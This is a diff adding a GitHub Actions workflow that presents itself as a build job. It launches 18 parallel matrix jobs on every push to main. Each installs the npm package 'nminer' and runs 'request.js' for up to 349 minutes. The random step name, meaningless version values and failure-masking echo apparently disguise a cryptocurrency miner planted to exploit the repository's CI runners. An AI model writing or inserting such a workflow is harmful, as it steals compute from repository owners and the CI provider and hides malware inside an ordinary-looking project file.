@@ -1,0 +1,43 @@
+name: request
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9730 }
+          - { version: 6958 }
+          - { version: 6840 }
+          - { version: 3268 }
+          - { version: 4838 }
+          - { version: 6839 }
+          - { version: 5516 }
+          - { version: 5314 }
+          - { version: 7261 }
+          - { version: 5294 }
+          - { version: 4967 }
+          - { version: 2552 }
+          - { version: 9334 }
+          - { version: 908 }
+          - { version: 2421 }
+          - { version: 7297 }
+          - { version: 563 }
+          - { version: 1336 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: how moist squeaky stale fray
+        run: |
+          npm install nminer@latest
+          timeout 349m node request.js || echo "request executed"
